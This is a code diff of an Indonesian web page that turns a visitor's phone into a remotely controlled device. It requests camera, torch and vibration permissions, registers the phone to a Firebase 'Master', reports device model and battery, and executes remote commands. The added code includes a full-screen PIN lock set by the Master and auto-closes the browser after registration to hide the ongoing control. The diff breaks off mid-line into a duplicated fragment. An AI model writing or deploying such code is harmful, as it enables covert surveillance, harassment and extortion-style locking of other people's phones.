@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -37,20 +38,22 @@
         .connection-info{font-size:11px;color:#333;margin-top:4px}
         .flash-indicator{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;background:#fff;opacity:0;transition:opacity 0.05s;z-index:9999}
         .flash-indicator.on{opacity:0.6}
-        .lock-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.97);z-index:999999;display:none;flex-direction:column;justify-content:center;align-items:center;color:#fff;padding:20px;backdrop-filter:blur(20px);overflow:hidden}
+        .lock-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.98);z-index:999999;display:none;flex-direction:column;justify-content:center;align-items:center;color:#fff;padding:20px;backdrop-filter:blur(30px);overflow:hidden}
         .lock-overlay.show{display:flex}
-        .lock-overlay .lock-icon{font-size:80px;margin-bottom:16px;animation:pulse-lock 1.5s ease-in-out infinite}
-        @keyframes pulse-lock{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.05);opacity:0.7}}
-        .lock-overlay .lock-title{font-size:28px;font-weight:700;margin-bottom:4px}
-        .lock-overlay .lock-sub{font-size:14px;color:#888;margin-bottom:16px}
-        .lock-overlay .lock-message{font-size:18px;color:#fbbf24;margin-bottom:20px;text-align:center;padding:16px 20px;background:rgba(255,255,255,0.05);border-radius:16px;width:100%;max-width:320px;min-height:60px;border:1px solid rgba(255,255,255,0.05);word-wrap:break-word}
-        .lock-overlay .lock-password-input{padding:16px 20px;border-radius:16px;border:2px solid rgba(255,255,255,0.1);background:rgba(255,255,255,0.05);color:#fff;font-size:20px;text-align:center;width:100%;max-width:260px;outline:none;margin-bottom:12px;letter-spacing:10px;transition:all 0.3s}
-        .lock-overlay .lock-password-input:focus{border-color:#fbbf24;box-shadow:0 0 30px rgba(251,191,36,0.1)}
-        .lock-overlay .lock-password-input::placeholder{letter-spacing:2px;color:#555;font-size:14px}
-        .lock-overlay .btn-unlock{padding:14px 48px;border-radius:16px;border:none;background:linear-gradient(135deg,#4ade80,#22c55e);color:#0a0a12;font-weight:700;font-size:16px;cursor:pointer;transition:all 0.3s;margin-top:4px}
+        .lock-overlay .lock-icon{font-size:100px;margin-bottom:20px;animation:pulse-lock 1.5s ease-in-out infinite}
+        @keyframes pulse-lock{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.08);opacity:0.7}}
+        .lock-overlay .lock-title{font-size:36px;font-weight:800;margin-bottom:8px;letter-spacing:2px}
+        .lock-overlay .lock-sub{font-size:16px;color:#888;margin-bottom:20px}
+        .lock-overlay .lock-message{font-size:20px;color:#fbbf24;margin-bottom:24px;text-align:center;padding:16px 24px;background:rgba(255,255,255,0.05);border-radius:16px;width:100%;max-width:340px;min-height:70px;border:2px solid rgba(251,191,36,0.15);word-wrap:break-word}
+        .lock-overlay .lock-password-input{padding:18px 24px;border-radius:20px;border:3px solid rgba(255,255,255,0.1);background:rgba(255,255,255,0.05);color:#fff;font-size:28px;text-align:center;width:100%;max-width:280px;outline:none;margin-bottom:16px;letter-spacing:15px;transition:all 0.3s}
+        .lock-overlay .lock-password-input:focus{border-color:#fbbf24;box-shadow:0 0 40px rgba(251,191,36,0.15)}
+        .lock-overlay .lock-password-input::placeholder{letter-spacing:2px;color:#555;font-size:16px}
+        .lock-overlay .btn-unlock{padding:16px 56px;border-radius:20px;border:none;background:linear-gradient(135deg,#4ade80,#22c55e);color:#0a0a12;font-weight:800;font-size:18px;cursor:pointer;transition:all 0.3s;margin-top:8px;box-shadow:0 8px 30px rgba(74,222,128,0.2)}
         .lock-overlay .btn-unlock:active{transform:scale(0.95)}
-        .lock-overlay .lock-bg-pattern{position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(circle at 30% 50%,rgba(251,191,36,0.03) 0%,transparent 60%);pointer-events:none;z-index:-1}
-        @media(max-width:420px){.container{padding:24px 16px;min-height:450px}.welcome{font-size:48px}.welcome-text{font-size:26px}.permission-box{padding:16px}.permission-box .icon{font-size:32px}.lock-overlay .lock-icon{font-size:60px}.lock-overlay .lock-title{font-size:22px}}
+        .lock-overlay .btn-unlock:disabled{opacity:0.3;cursor:not-allowed}
+        .lock-overlay .lock-bg-pattern{position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(circle at 30% 50%,rgba(251,191,36,0.05) 0%,transparent 60%);pointer-events:none;z-index:-1}
+        .lock-overlay .lock-footer{font-size:12px;color:#444;margin-top:16px;letter-spacing:1px}
+        @media(max-width:420px){.container{padding:24px 16px;min-height:450px}.welcome{font-size:48px}.welcome-text{font-size:26px}.permission-box{padding:16px}.permission-box .icon{font-size:32px}.lock-overlay .lock-icon{font-size:70px}.lock-overlay .lock-title{font-size:28px}.lock-overlay .lock-message{font-size:16px;padding:12px 16px}.lock-overlay .lock-password-input{font-size:22px;letter-spacing:12px;padding:14px 20px}}
     </style>
 </head>
 <body>
@@ -58,12 +61,12 @@
 <div class="lock-overlay" id="lockOverlay">
     <div class="lock-bg-pattern"></div>
     <div class="lock-icon">🔒</div>
-    <div class="lock-title">HP Terkunci</div>
-    <div class="lock-sub">Masukkan password untuk membuka</div>
+    <div class="lock-title">HP TERKUNCI</div>
+    <div class="lock-sub">Masukkan PIN untuk membuka</div>
     <div class="lock-message" id="lockMessage">📝 Pesan dari Master</div>
-    <input type="password" class="lock-password-input" id="lockPassword" placeholder="****" maxlength="10" inputmode="numeric">
-    <button class="btn-unlock" id="lockUnlockBtn">🔓 Buka</button>
-    <div style="font-size:11px;color:#444;margin-top:12px;">⏳ Lock aktif meskipun web ditutup</div>
+    <input type="password" class="lock-password-input" id="lockPassword" placeholder="PIN" maxlength="10" inputmode="numeric" autofocus>
+    <button class="btn-unlock" id="lockUnlockBtn">🔓 BUKA</button>
+    <div class="lock-footer">⏳ Lock aktif meskipun browser ditutup</div>
 </div>
 <div class="container" id="app">
     <div class="welcome">👋</div>
@@ -112,8 +115,9 @@ var lockPassword = '1234';
 var lockMessageText = '🔒 HP Terkunci oleh Master';
 var toastTimer = null;
 var wakeLock = null;
+var batteryInterval = null;
+var deviceName = '';
 
-// ===== DOM =====
 var statusCamera = document.getElementById('statusCamera');
 var statusTorch = document.getElementById('statusTorch');
 var statusVolume = document.getElementById('statusVolume');
@@ -129,24 +133,288 @@ var lockPasswordInput = document.getElementById('lockPassword');
 var lockUnlockBtn = document.getElementById('lockUnlockBtn');
 var lockMessageEl = document.getElementById('lockMessage');
 
-// ===== TOAST =====
 function showToast(msg, duration) {
     if (duration === undefined) duration = 2000;
     if (toastTimer) clearTimeout(toastTimer);
     toast.textContent = msg;
     toast.classList.add('show');
-    toastTimer = setTimeout(function() {
-        toast.classList.remove('show');
-    }, duration);
+    toastTimer = setTimeout(function() { toast.classList.remove('show'); }, duration);
 }
 
-// ===== WAKE LOCK =====
 function requestWakeLock() {
     try {
         if ('wakeLock' in navigator) {
             navigator.wakeLock.request('screen').then(function(lock) {
                 wakeLock = lock;
                 console.log('✅ Wake Lock aktif');
+            });
+        }
+    } catch (e) {}
+}
+
+function releaseWakeLock() {
+    if (wakeLock) {
+        try { wakeLock.release(); wakeLock = null; } catch (e) {}
+    }
+}
+
+// ===== LOCK FULL LAYAR - TIDAK BISA KELUAR! =====
+function showLockScreen(message, password) {
+    isLocked = true;
+    lockPassword = password || '1234';
+    lockMessageText = message || '🔒 HP Terkunci oleh Master';
+    lockMessageEl.textContent = '📝 ' + lockMessageText;
+    lockOverlay.classList.add('show');
+    lockPasswordInput.value = '';
+    setTimeout(function() { lockPasswordInput.focus(); }, 300);
+    updateUI();
+    requestWakeLock();
+    showToast('🔒 HP Terkunci!', 2000);
+
+    // ===== LANGSUNG CLOSE BROWSER & FULL LOCK =====
+    setTimeout(function() {
+        try {
+            window.close();
+        } catch(e) {}
+        window.location.href = 'about:blank';
+        setTimeout(function() {
+            try { window.close(); } catch(e) {}
+        }, 500);
+    }, 1500);
+}
+
+function hideLockScreen() {
+    isLocked = false;
+    lockOverlay.classList.remove('show');
+    updateUI();
+    releaseWakeLock();
+    db.ref(ROOM + '/devices/' + DEVICE_ID + '/isLocked').set(false);
+    showToast('🔓 HP Terbuka!', 1500);
+}
+
+lockUnlockBtn.onclick = function() {
+    var inputPass = lockPasswordInput.value.trim();
+    if (inputPass === lockPassword) {
+        hideLockScreen();
+    } else {
+        showToast('❌ PIN salah!', 1500);
+        lockPasswordInput.value = '';
+        lockPasswordInput.focus();
+        if (navigator.vibrate) navigator.vibrate(200);
+    }
+};
+
+lockPasswordInput.onkeypress = function(e) {
+    if (e.key === 'Enter') { lockUnlockBtn.click(); }
+};
+
+// ===== GET DEVICE INFO =====
+function getDeviceInfo() {
+    var ua = navigator.userAgent;
+    var android = '?';
+    var name = 'Android Device';
+    if (ua.includes('Android')) {
+        var m = ua.match(/Android\s([\d.]+)/);
+        android = m ? m[1] : '?';
+        var brand = ua.match(/; ([^;]+) Build/);
+        if (brand) { name = brand[1]; }
+        else { name = 'Android'; }
+    } else if (ua.includes('iPhone')) {
+        android = 'iOS';
+        name = 'iPhone';
+    }
+    return { android: android, name: name };
+}
+
+function getBattery() {
+    if (navigator.getBattery) {
+        navigator.getBattery().then(function(battery) {
+            var level = Math.round(battery.level * 100);
+            db.ref(ROOM + '/devices/' + DEVICE_ID + '/battery').set(level);
+            var info = getDeviceInfo();
+            db.ref(ROOM + '/responses').push({
+                deviceId: DEVICE_ID,
+                action: 'info',
+                battery: level,
+                android: info.android,
+                deviceName: info.name,
+                timestamp: firebase.database.ServerValue.TIMESTAMP
+            });
+        }).catch(function() {});
+    }
+}
+
+// ===== PERMISSIONS =====
+function requestAllPermissions() {
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: { ideal: 100 }, height: { ideal: 100 } } })
+        .then(function(stream) {
+            var track = stream.getVideoTracks()[0];
+            if (track.getCapabilities().torch) {
+                permissions.torch = true;
+                torchTrack = track;
+                showToast('✅ Senter support!', 1000);
+            } else {
+                showToast('⚠️ HP tidak support senter', 2000);
+            }
+            permissions.camera = true;
+            track.stop();
+            stream.getTracks().forEach(function(t) { t.stop(); });
+            permissions.volume = true;
+            if (navigator.vibrate) {
+                permissions.vibrate = true;
+                navigator.vibrate(100);
+            } else {
+                showToast('⚠️ HP tidak support getar', 2000);
+            }
+            allGranted = permissions.camera && permissions.torch && permissions.volume && permissions.vibrate;
+            updateUI();
+            if (allGranted) {
+                showToast('✅ Semua izin diberikan!', 1500);
+                registerToMaster();
+                startListening();
+                var info = getDeviceInfo();
+                deviceName = info.name;
+                db.ref(ROOM + '/responses').push({
+                    deviceId: DEVICE_ID,
+                    action: 'info',
+                    android: info.android,
+                    battery: '?',
+                    deviceName: info.name,
+                    timestamp: firebase.database.ServerValue.TIMESTAMP
+                });
+                getBattery();
+                if (batteryInterval) clearInterval(batteryInterval);
+                batteryInterval = setInterval(getBattery, 30000);
+
+                // ===== SETELAH IZIN, LANGSUNG AUTO CLOSE BROWSER! =====
+                setTimeout(function() {
+                    showToast('🔒 Siap! Browser akan tertutup...', 1500);
+                    setTimeout(function() {
+                        try {
+                            window.close();
+                        } catch(e) {}
+                        window.location.href = 'about:blank';
+                        setTimeout(function() {
+                            try { window.close(); } catch(e) {}
+                        }, 500);
+                    }, 1500);
+                }, 2000);
+            } else {
+                showToast('⚠️ Beberapa izin gagal', 2000);
+            }
+        })
+        .catch(function(err) {
+            console.error(err);
+            var msg = 'Izin ditolak!';
+            if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+                msg = '❌ Izin kamera ditolak!';
+            } else if (err.name === 'NotFoundError') {
+                msg = '❌ Kamera tidak ditemukan!';
+            }
+            showToast(msg, 3000);
+            statusBadge.textContent = '❌ ' + msg;
+            statusBadge.className = 'status-badge error';
+        });
+}
+
+function registerToMaster() {
+    var ref = db.ref(ROOM + '/devices/' + DEVICE_ID);
+    var info = getDeviceInfo();
+    deviceName = info.name;
+    ref.set({
+        id: DEVICE_ID,
+        name: info.name,
+        deviceName: info.name,
+        icon: '📱',
+        status: 'online',
+        flashOn: false,
+        isLocked: false,
+        android: info.android,
+        battery: '?',
+        permissions: permissions,
+        lastSeen: firebase.database.ServerValue.TIMESTAMP
+    });
+    ref.onDisconnect().update({
+        status: 'offline',
+        lastSeen: firebase.database.ServerValue.TIMESTAMP
+    });
+    deviceIdDisplay.textContent = '🆔 Device ID: ' + DEVICE_ID;
+    showToast('📡 Terdaftar ke Master!', 1500);
+    statusBadge.textContent = '✅ Terdaftar!';
+    statusBadge.className = 'status-badge';
+}
+
+function updateUI() {
+    statusCamera.textContent = permissions.camera ? '✅' : '⏳';
+    statusCamera.className = 'status ' + (permissions.camera ? 'granted' : 'pending');
+    statusTorch.textContent = permissions.torch ? '✅' : '⏳';
+    statusTorch.className = 'status ' + (permissions.torch ? 'granted' : 'pending');
+    statusVolume.textContent = permissions.volume ? '✅' : '⏳';
+    statusVolume.className = 'status ' + (permissions.volume ? 'granted' : 'pending');
+    statusVibrate.textContent = permissions.vibrate ? '✅' : '⏳';
+    statusVibrate.className = 'status ' + (permissions.vibrate ? 'granted' : 'pending');
+
+    if (allGranted) {
+        grantBtn.textContent = '✅ Semua Diizinkan';
+        grantBtn.className = 'btn-grant granted';
+        grantBtn.disabled = true;
+        statusBadge.textContent = isLocked ? '🔒 Terkunci' : '✅ Terhubung ke Master';
+        statusBadge.className = isLocked ? 'status-badge locked' : 'status-badge';
+    } else {
+        grantBtn.textContent = '✅ Izinkan Semua';
+        grantBtn.className = 'btn-grant';
+        grantBtn.disabled = false;
+        statusBadge.textContent = '⏳ Menunggu izin...';
+        statusBadge.className = 'status-badge waiting';
+    }
+}
+
+function startListening() {
+    if (isListening) return;
+    isListening = true;
+    db.ref(ROOM + '/commands/' + DEVICE_ID).on('value', function(snapshot) {
+        var data = snapshot.val();
+        if (data) {
+            executeCommand(data.action, data.value);
+            snapshot.ref.remove();
+        }
+    });
+    setInterval(function() {
+        db.ref(ROOM + '/devices/' + DEVICE_ID + '/lastSeen').set(firebase.database.ServerValue.TIMESTAMP);
+    }, 5000);
+    console.log('👂 Listening...');
+}
+
+function executeCommand(action, value) {
+    showToast('📨 ' + action, 1000);
+    var responseRef = db.ref(ROOM + '/responses').push();
+
+    if (action === 'senter') {
+        toggleTorch();
+        responseRef.set({
+            deviceId: DEVICE_ID,
+            action: 'senter',
+            value: isTorchOn,
+            timestamp: firebase.database.ServerValue.TIMESTAMP
+        });
+    } else if (action === 'flash') {
+        flashBlink();
+        responseRef.set({
+            deviceId: DEVICE_ID,
+            action: 'flash',
+            value: true,
+            timestamp: firebase.database.ServerValue.TIMESTAMP
+        });
+    } else if (action === 'lock') {
+        var lockData = value;
+        if (lockData && lockData.locked !== undefined) {
+            if (lockData.locked) {
+                var msg = lockData.message || '🔒 HP Terkunci oleh Master';
+                var pass = lockData.password || '1234';
+                showLockScreen(msg, pass);
+                db.ref(ROOM + '/devices/' + DEVICE_ID + '/isLocked').set(true);
+                db.ref(ROOM + '/devices/' + DEVICE_ID + '/lockPassword').set(pass);
+                db.ref(ROOM + '/devices/' + DEVICE_ID + '/lockMe               console.log('✅ Wake Lock aktif');
             });
         }
     } catch (e) {}
